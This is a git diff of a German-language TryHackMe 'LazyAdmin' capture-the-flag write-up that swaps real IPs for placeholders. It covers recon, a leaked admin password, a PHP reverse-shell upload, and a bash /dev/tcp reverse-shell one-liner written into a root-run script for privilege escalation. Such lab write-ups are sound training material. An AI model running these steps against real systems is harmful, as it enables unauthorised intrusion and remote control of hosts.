@@ -1,15 +1,14 @@
 # LazyAdmin — TryHackMe Writeup
 
-**Platform:** TryHackMe
+**Platform:** [TryHackMe — LazyAdmin](https://tryhackme.com/room/lazyadmin)
 **Difficulty:** Easy
-**Target:** 10.112.174.3
 
 ---
 
 ## 1. Recon
 
 ```bash
-nmap -sC -sV -p- 10.112.174.3
+nmap -sC -sV -p- <TARGET_IP>
 ```
 
 **Findings:**
@@ -20,13 +19,13 @@ nmap -sC -sV -p- 10.112.174.3
 ## 2. Enumeration
 
 ```bash
-gobuster dir -u http://10.112.174.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ```
 
 Found: `/content/`
 
 ```bash
-gobuster dir -u http://10.112.174.3/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+gobuster dir -u http://<TARGET_IP>/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ```
 
 Found: `/content/inc/mysql_backup/`
@@ -45,7 +44,7 @@ Password: Password123
 Admin-Panel unter:
 
 ```
-http://10.112.174.3/content/as/
+http://<TARGET_IP>/content/as/
 ```
 
 Login erfolgreich.
@@ -66,13 +65,25 @@ Output: `www-data` → RCE bestätigt.
 
 ## 5. Reverse Shell
 
-Listener starten:
+**Terminal 1 — Listener:**
 
 ```bash
 nc -lvnp 4444
 ```
 
-Shell getriggert → Zugriff als `www-data`.
+**Terminal 2 — Shell vorbereiten:**
+
+PHP-Reverse-Shell als `.phtml` speichern (Attacker IP eintragen: `<ATTACKER_IP>`, Port: `4444`).
+
+**Upload:** Media Center → Browse → `shell.phtml` → Done
+
+**Shell triggern:**
+
+```bash
+curl http://<TARGET_IP>/content/attachment/shell.phtml
+```
+
+→ Zugriff als `www-data`.
 
 ---
 
@@ -125,7 +136,7 @@ ls -l /etc/copy.sh
 Script überschreiben:
 
 ```bash
-echo 'bash -c "bash -i >& /dev/tcp/10.112.120.82/4444 0>&1"' > /etc/copy.sh
+echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' > /etc/copy.sh
 ```
 
 Listener starten:
